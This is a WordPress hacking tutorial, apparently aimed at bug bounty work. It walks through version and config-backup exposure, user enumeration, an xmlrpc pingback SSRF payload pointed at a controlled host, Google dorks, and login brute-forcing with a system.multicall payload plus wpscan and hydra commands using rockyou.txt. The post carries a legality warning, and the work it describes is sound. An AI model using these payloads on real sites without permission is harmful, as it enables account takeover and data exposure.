---
title: "Wordpress Hacking"
date: 2026-03-20 00:00:00 +0000
categories: [Web,Wordpress]
tags: [recon, bruteforce, google dorking, misconfigurations]
pin: true
image:
  path: ../assets/img/POST(3)/wpd.png
  alt: Wordpress Hacking Live Targets
---

Hello Friend, I Hope You Are Doing Good ! Today I’m Going To Explain Wordpress Hacking; When We Can Legally Get Into Wordpress Sites .

### **Why Wordpress ?**

Wordpress is Running _~43%_ of \[All Sites in the Internet\], It’s Every Where .

![AISummary](../assets/img/POST(3)/1.png)
*AI Summary*

Wordpress is Widely Used

That’s For Some Reasons :

*   _Ease of Use_
*   _Open Source & Free_
*   _Massive Customization_

> **Warning: Don’t Exploit or Harm or Steal Data From Any Site . If You Want To Test Legally You Must Have the Permission To Do. Every Thing I Done in this Blog is For Education Only !, _All Domains,IPs in This Blog Are Hided For Confidentiality._**
{: .prompt-danger }

* * *

#### Information Exposures :

### Version Disclosures & Site Infrastructure :

_Often, Version Disclosures Are Considered As_ **_Informative or N/A_** _in Most Situation. Except,_ **_You Are Able To Get a POC That You Can Exploit a Vulnerable Version of a Software_** _._

![Hackerone](../assets/img/POST(3)/3.png)
*Hackerone: Info | N/A*

We Can **Get Wordpress Version With A Lot of Ways** .

1.  **/wp-links-opml.php : \[Wordpress Framework Version\]**

    ![WordPress/5.9.13](../assets/img/POST(3)/2.png)
    *WordPress/5.9.13*

    and **If You Can Get a POC That You Can Exploit This Specific Wordpress Version the Report Will Become From Informative To High/Critical**

    ![nvd.gov](../assets/img/POST(3)/20.png)
    *[nvd.gov](https://nvd.nist.gov/vuln/search#/nvd/home?keyword=wordpress%205.9.13&resultType=records)*

2. **/wp-json** **: \[Structure of the Whole Wordpress Site\]**

    ![Plugins&API](../assets/img/POST(3)/25.png)
    *Plugins Names, Structure, API Endpoints + Methods Used*

3. **/readme.html :**

    ![readme](../assets/img/POST(3)/10.png)

4. **Forbidden or Not Found : \[403, 404\]**

    **Even, _If Some Sites Uses Reverse Proxies It Can Expose the Backend Web Servers Versions Via Error Pages_ .**

Often, Paths Which Triggers Errors Are :

/wp-includes/  
/wp-content/  
/wp-json/wp/v2/users  
/wp-config.php  
/NotFoundStuff-eno2XG7h1xIrCkjQkra4GgsWoZ0xHh9hvRQCg  
  

![Apache/2.4.41](../assets/img/POST(3)/6.png)
*Apache/2.4.41*

### **Sensitive Exposures :**

1.  **I Sometimes Found Backups Of Wordpress Forbidden Files By Just Adding Extensions Like .txt,.bak,etc.**

    ![Leaks](../assets/img/POST(3)/7.png)

    **/wp-config.php → /wp-config.php.txt**

2. **Sensitive Paths That Doesn’t Give Forbidden :**

    Paths Like **/wp-content/uploads** Should Give 403 Forbidden :

    ![UploadsNot403](../assets/img/POST(3)/8.png)

    **/wp-content/uploads**

    **[+] _Sometimes You Can Find IPs Behind Reverse Proxies in Those Directory Listing Pages . You Will Bypass WAFs With this Dangerous Disclosure !_**

    ![DigCommand](../assets/img/POST(3)/23.png)

    **CNAME → A Records**

    ![call](../assets/img/POST(3)/21.png)
    _Real Backend Server IP, **Reported instantly**_

3. **/wp-content/plugins :**

    ![](../assets/img/POST(3)/9.png)
    
4. **/wp-content/debug.log :**

    ![](../assets/img/POST(3)/18.png)
    *Errors Logs*

* * *

#### Users Enumeration :

_Like Version Disclosures, Triage Usually Closes Those Reports As Informative or N/A ._

1.  **/wp-json/wp/v2/users :**

    ![call](../assets/img/POST(3)/11.png)
    *Users*

2. **/wp-login.php :**

    ![login](../assets/img/POST(3)/16.png)
    _Incorrect Password For a **True Username**_

3. **/wp-json/oembed/1.0/embed?url= : \[It Can Be Disabled From a Config\]**

    ![call](../assets/img/POST(3)/42.png)
    *A Post id*

    ```bash
    echo "https://example.com/?p=41010" | jq -rR @uri
    ```

    ![](../assets/img/POST(3)/44.png)
    *Url Encoding*

    ![](../assets/img/POST(3)/43.png)
    *Get With Author Data \[Vulnerable for UserEnumeration\]*

* * *

#### Left Bad Actions :

_Actions That Must Be Disabled ._

1.  **/wp-mail.php** **:**

    ![](../assets/img/POST(3)/14.png)
    *Disabled*

    **If This Action Was Not Disabled. Any Unauthenticated User Can Publish Content . Legacy Wordpress Versions Have wp-mail.php Action Allowed By Default !**

2. **/wp-admin/install.php :**

    ![](../assets/img/POST(3)/19.png)
    *Already installed*

    **If Something Crashes Like the Database in a Wordpress This Already installed Page Can Allow Attackers to Reinstall the Wordpress Site “famous 5-minute WordPress installation”**

* * *

#### SSRF : (xmlrpc.php)

_xmlrpc.php Has Many Functionalities . Like Publishing, Editing, Deleting Posts, …_

**One of Those Functionalities \[pingback.ping\] If Allowed Can Lead To SSRF (Server Side Request Forgery ) Which is Ping Backs .**

![](../assets/img/POST(3)/4.png)
*/xmlrpc.php*

Now, We Want to List All Methods We Can Use :

```xml
<methodCall>    
<methodName>system.listMethods</methodName>    
<params></params>    
</methodCall>
```

![](../assets/img/POST(3)/5.png)

```xml
<?xml version="1.0" encoding="UTF-8" ?>  
<methodResponse>  
    <params>  
        <param>  
        <value>  
            <array>  
                <data>  
                    <value>  
                        <string>system.multicall</string>  
                    </value>  
                    <value>  
                        <string>system.listMethods</string>  
                    </value>  
                    <value>  
                        <string>system.getCapabilities</string>  
                    </value>  
                    <value>  
                        <string>demo.addTwoNumbers</string>  
                    </value>  
                    <value>  
                        <string>demo.sayHello</string>  
                    </value>  
                    <value>  
                        <string>pingback.extensions.getPingbacks</string>  
                    </value>  
                    <value>  
                        <string>pingback.ping</string>  
                    </value>  
                    <value>  
                        <string>mt.publishPost</string>  
                    </value>  
                    <value>  
                        <string>mt.getTrackbackPings</string>  
                    </value>  
                    <value>  
                        <string>mt.supportedTextFilters</string>  
                    </value>  
                    <value>  
                        <string>mt.supportedMethods</string>  
                    </value>  
                    <value>  
                        <string>mt.setPostCategories</string>  
                    </value>  
                    <value>  
                        <string>mt.getPostCategories</string>  
                    </value>  
                    <value>  
                        <string>mt.getRecentPostTitles</string>  
                    </value>  
                    <value>  
                        <string>mt.getCategoryList</string>  
                    </value>  
                    <value>  
                        <string>metaWeblog.getUsersBlogs</string>  
                    </value>  
                    <value>  
                        <string>metaWeblog.deletePost</string>  
                    </value>  
                    <value>  
                        <string>metaWeblog.newMediaObject</string>  
                    </value>  
                    <value>  
                        <string>metaWeblog.getCategories</string>  
                    </value>  
                    <value>  
                        <string>metaWeblog.getRecentPosts</string>  
                    </value>  
                    <value>  
                        <string>metaWeblog.getPost</string>  
                    </value>  
                    <value>  
                        <string>metaWeblog.editPost</string>  
                    </value>  
                    <value>  
                        <string>metaWeblog.newPost</string>  
                    </value>  
                    <value>  
                        <string>blogger.deletePost</string>  
                    </value>  
                    <value>  
                        <string>blogger.editPost</string>  
                    </value>  
                    <value>  
                        <string>blogger.newPost</string>  
                    </value>  
                    <value>  
                        <string>blogger.getRecentPosts</string>  
                    </value>  
                    <value>  
                        <string>blogger.getPost</string>  
                    </value>  
                    <value>  
                        <string>blogger.getUserInfo</string>  
                    </value>  
                    <value>  
                        <string>blogger.getUsersBlogs</string>  
                    </value>  
                    <value>  
                        <string>wp.restoreRevision</string>  
                    </value>  
                    <value>  
                        <string>wp.getRevisions</string>  
                    </value>  
                    <value>  
                        <string>wp.getPostTypes</string>  
                    </value>  
                    <value>  
                        <string>wp.getPostType</string>  
                    </value>  
                    <value>  
                        <string>wp.getPostFormats</string>  
                    </value>  
                    <value>  
                        <string>wp.getMediaLibrary</string>  
                    </value>  
                    <value>  
                        <string>wp.getMediaItem</string>  
                    </value>  
                    <value>  
                        <string>wp.getCommentStatusList</string>  
                    </value>  
                    <value>  
                        <string>wp.newComment</string>  
                    </value>  
                    <value>  
                        <string>wp.editComment</string>  
                    </value>  
                    <value>  
                        <string>wp.deleteComment</string>  
                    </value>  
                    <value>  
                        <string>wp.getComments</string>  
                    </value>  
                    <value>  
                        <string>wp.getComment</string>  
                    </value>  
                    <value>  
                        <string>wp.setOptions</string>  
                    </value>  
                    <value>  
                        <string>wp.getOptions</string>  
                    </value>  
                    <value>  
                        <string>wp.getPageTemplates</string>  
                    </value>  
                    <value>  
                        <string>wp.getPageStatusList</string>  
                    </value>  
                    <value>  
                        <string>wp.getPostStatusList</string>  
                    </value>  
                    <value>  
                        <string>wp.getCommentCount</string>  
                    </value>  
                    <value>  
                        <string>wp.deleteFile</string>  
                    </value>  
                    <value>  
                        <string>wp.uploadFile</string>  
                    </value>  
                    <value>  
                        <string>wp.suggestCategories</string>  
                    </value>  
                    <value>  
                        <string>wp.deleteCategory</string>  
                    </value>  
                    <value>  
                        <string>wp.newCategory</string>  
                    </value>  
                    <value>  
                        <string>wp.getTags</string>  
                    </value>  
                    <value>  
                        <string>wp.getCategories</string>  
                    </value>  
                    <value>  
                        <string>wp.getAuthors</string>  
                    </value>  
                    <value>  
                        <string>wp.getPageList</string>  
                    </value>  
                    <value>  
                        <string>wp.editPage</string>  
                    </value>  
                    <value>  
                        <string>wp.deletePage</string>  
                    </value>  
                    <value>  
                        <string>wp.newPage</string>  
                    </value>  
                    <value>  
                        <string>wp.getPages</string>  
                    </value>  
                    <value>  
                        <string>wp.getPage</string>  
                    </value>  
                    <value>  
                        <string>wp.editProfile</string>  
                    </value>  
                    <value>  
                        <string>wp.getProfile</string>  
                    </value>  
                    <value>  
                        <string>wp.getUsers</string>  
                    </value>  
                    <value>  
                        <string>wp.getUser</string>  
                    </value>  
                    <value>  
                        <string>wp.getTaxonomies</string>  
                    </value>  
                    <value>  
                        <string>wp.getTaxonomy</string>  
                    </value>  
                    <value>  
                        <string>wp.getTerms</string>  
                    </value>  
                    <value>  
                        <string>wp.getTerm</string>  
                    </value>  
                    <value>  
                        <string>wp.deleteTerm</string>  
                    </value>  
                    <value>  
                        <string>wp.editTerm</string>  
                    </value>  
                    <value>  
                        <string>wp.newTerm</string>  
                    </value>  
                    <value>  
                        <string>wp.getPosts</string>  
                    </value>  
                    <value>  
                        <string>wp.getPost</string>  
                    </value>  
                    <value>  
                        <string>wp.deletePost</string>  
                    </value>  
                    <value>  
                        <string>wp.editPost</string>  
                    </value>  
                    <value>  
                        <string>wp.newPost</string>  
                    </value>  
                    <value>  
                        <string>wp.getUsersBlogs</string>  
                    </value>  
                </data>  
            </array>  
        </value>  
        </param>  
    </params>  
</methodResponse>
```

> Note: Even This, SSRFs Can Be Blocked From the Internal Firewall Before It Arrives To You !

We Can Check For SSRF With This Payload Form :

```xml
<methodCall>  
<methodName>pingback.ping</methodName>  
<params><param>  
<value><string>http://ControlledEnv.com:PORT</string></value>  
</param><param><value><string>http://AnyBloG\_URL\_onTheSite/?p=8129</string>  
</value></param></params>  
</methodCall>
```

You Can Use [**webhook**](https://webhook.site/) **It’s Great To Get _POCs_ of These Stuff** :

![](../assets/img/POST(3)/12.png)

Response

```xml
<?xml version="1.0" encoding="UTF-8"?>  
<methodResponse>  
  <fault>  
    <value>  
      <struct>  
        <member>  
          <name>faultCode</name>  
          <value><int>0</int></value>  
        </member>  
        <member>  
          <name>faultString</name>  
          <value><string></string></value>  
        </member>  
      </struct>  
    </value>  
  </fault>  
</methodResponse>
```

![](../assets/img/POST(3)/13.png)
*Out-of-Band SSRF*

* * *

#### Google Dorks & Crawling Records : \[+tools\]

**_Wordpress Nature is Easy To Crawl_** _That’s Make Web Spiders Crawl Urls Pages Content That Can Contain Sensitive Data . Which Can Be Got From Google Dorks and Sites Like_ [**_Waybackmachine_**](https://web.archive.org/)_._

## Most Used Search Keys in Wordpress Google Dorking :

*   **inurl:**
*   **site:**
*   **intitle:**
*   **inpage:**
*   **filetype:**

![](../assets/img/POST(3)/27.png)
*/wp-content/uploads Directory of Specific Domain*

![](../assets/img/POST(3)/33.png)
*Txt files Under /wp-content/uploads/ in the Whole Internet*

![](../assets/img/POST(3)/34.png)
*Backup Directories*

**\[\*\] You Can Combine Google Dorks Search Keys and Target Specific Sites, data**

**\[+\] You Can Juicy Data From Wordpress Google Dorks**

## Tools :

*   katana \[[https://github.com/projectdiscovery/katana](https://github.com/projectdiscovery/katana)\]
*   waymore \[[https://github.com/xnl-h4ck3r/waymore](https://github.com/xnl-h4ck3r/waymore)\]
*   gau \[[https://github.com/lc/gau](https://github.com/lc/gau)\]

#### Katana :

```bash
katana -u https://example.com/
```

![](../assets/img/POST(3)/45.png)
*Crawling*

#### Waymore :

```bash
waymore -i example.com-mode U -oU waymore-Output\_example.com.txt
```

![](../assets/img/POST(3)/28.png)
*waymore*

![](../assets/img/POST(3)/29.png)
*__11,296__ Unique Url*

![](../assets/img/POST(3)/30.png)

#### Gau (Get All Urls) :

```bash
gau example.com --subs
```

![](../assets/img/POST(3)/31.png)
*gau*

##### Combine :

```bash
cat gau-Output_dsu.edu.pk.txt  waymore-Output_dsu.edu.pk.txt | uro | sort -u > combined_sorted_output.txt
```

![](../assets/img/POST(3)/32.png)
*Combined*

You Can Use [**GHDB**](https://www.exploit-db.com/google-hacking-database) (Google Hacking Data Base) To Get Prepared Payloads .

![exploitdb](../assets/img/POST(3)/26.png)
*Wordpress Dorks GHDB*

* * *

#### Login Bruteforcing : (With & Without xmlrpc.php)

#### XMLRPC Enabled : \[Tool →**[wpscan](https://github.com/wpscanteam/wpscan)**\] (Reliable)

**We Can the Method system.multicall + wp.getUserBlogs \[Require Creds\] To Brute Forcing a Wordpress Site .**

```xml
<?xml version="1.0" encoding="utf-8"?>  
<methodCall>  
  <methodName>system.multicall</methodName>  
  <params>  
    <param>  
      <value>  
        <array>  
          <data>  
            <value>  
              <struct>  
                <member>  
                  <name>methodName</name>  
                  <value><string>wp.getUsersBlogs</string></value>  
                </member>  
                <member>  
                  <name>params</name>  
                  <value>  
                    <array>  
                      <data>  
                        <value><string>admin</string></value>   
                        <value><string>password123</string></value> </data>  
                    </array>  
                  </value>  
                </member>  
              </struct>  
            </value>  
            <value>  
              <struct>  
                <member>  
                  <name>methodName</name>  
                  <value><string>wp.getUsersBlogs</string></value>  
                </member>  
                <member>  
                  <name>params</name>  
                  <value>  
                    <array>  
                      <data>  
                        <value><string>admin</string></value>  
                        <value><string>P@ssw0rd123</string\></value>  
                      </data>  
                    </array>  
                  </value>  
                </member>  
              </struct>  
            </value>  
          </data>  
        </array>  
      </value>  
    </param>  
  </params>  
</methodCall>
```

![](../assets/img/POST(3)/48.png)
*Response*

**Bypassing Captcha(s), Ratelimiting Very Fast You Can Bruteforce A lot of Usernames and Passwords in One POST Request .**

> **\[\*\] I Cannot Brute Force on a Live Site\[Not Authorized To Do\], So That is a Local Target \[**[**Mr.robot CTF**](https://d0natel00.medium.com/vulnhub-mrrobot-ctf-walkthrough-6521a6031b84)**\].**

```bash
wpscan --url http://example.com --usernames target_user --passwords rockyou.txt
```

![](https://cdn-images-1.medium.com/max/800/1*Di_8rTjmzlvPnCIo3CWGbw.png)
*32 Seconds*

**## XMLRPC Disabled : \[Tool →**[**hydra**](https://www.kali.org/tools/hydra/)**\] (Less Reliable)**

_Brute Forcing Wordpress Like Any Other Site_. Always, **Slow and If there Are Captcha and RateLimiting it Becomes Harder But Not Impossible There Are Techniques To Bypass Those Obstacles .**

```bash
hydra -t \[threads-number\] -l target_user -P rockyou.txt target_ip or domain http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=ERROR"  
```

> -L for usernames file -p for\_single\_password F= --> Fail Message, S= --> Success Message

![](../assets/img/POST(3)/41.png)
*3 Minutes*

* * *

#### Wordpress Vulnerable Plugins : \[Ai & OpenSource Code\](Most Bugs)

**_Security Researchers Have Found A Lot of Vulnerabilities in Wordpress Plugins._ Now AI Entered the Game and Make It Wild and Fast ! Because Wordpress is OpenSource, the AI Can Perform Static Analysis on Plugins Code and Get Security Flaws From it _._**

**One Example : \[Exploited Now in the Wild\]**

**Ally : CVE-2026–2413 : SQL Injection : Severity → High**

![](../assets/img/POST(3)/36.png)
*Ally*

![](../assets/img/POST(3)/37.png)

#### Detecting :

_To Get the Plugins That a Wordpress Site Working With There Are Some Methods To Get That :_

1.  **/wp-content/plugins** : **\[The Most Obvious Way if 200 OK\]**

2. **WebSite Source Code & Crawling the Site As We Did \[Passive,Aggressive\]**

3. [**Wappalyzer**](https://chromewebstore.google.com/detail/wappalyzer-technology-pro/gppongmhjkpfnbhagpmjfkannfbllamg?hl=en) **\[Chrome Extension\] \[Passive\]**

4. **wpscan Enumeration ( — enumerate) \[Passive** + **Aggressive**\]

![](../assets/img/POST(3)/46.png)
*wpscan Enumeration Modes*

```bash
wpscan --url https://example.com/ --enumerate ap
```

![](../assets/img/POST(3)/47.png)
*All Plugins Enumeration*

**## CVEs Exploits :**

[packetstorm.news](https://packetstorm.news/ "https://packetstorm.news/")[](https://packetstorm.news/)

![](../assets/img/POST(3)/39.png)
*Search For Wordpress Plugins*

[**OffSec's Exploit Database Archive**  
_The Exploit Database - Exploits, Shellcode, 0days, Remote Exploits, Local Exploits, Web Apps, Vulnerability Reports…_www.exploit-db.com](https://www.exploit-db.com/ "https://www.exploit-db.com/")[](https://www.exploit-db.com/)

![exploitdb](../assets/img/POST(3)/40.png)
*Exploits Section, Search For Wordpress Plugins*

**You Can Search in** [**The Hacker News**](https://thehackernews.com/) **For Wordpress :**

**(Google Programable Search Engine)**

![critical](../assets/img/POST(3)/38.png)
*Plugins Are The Critical Security Risk in Wordpress Sites*

* * *

#### Conclusion :

![JokerDancing](../assets/img/POST(3)/joker.gif)
*Joker Dancing*

In the End, **the Internet is Full of Vulnerable Wordpress Sites** \[I Mean It **Ton of Sites**\] **Exposing a Big Security Risk**. So, Our Job is make the Internet Safer By **Learning and Reporting** .

**I Hope You Got Some Useful Information From this Write-up, Goodbye** !
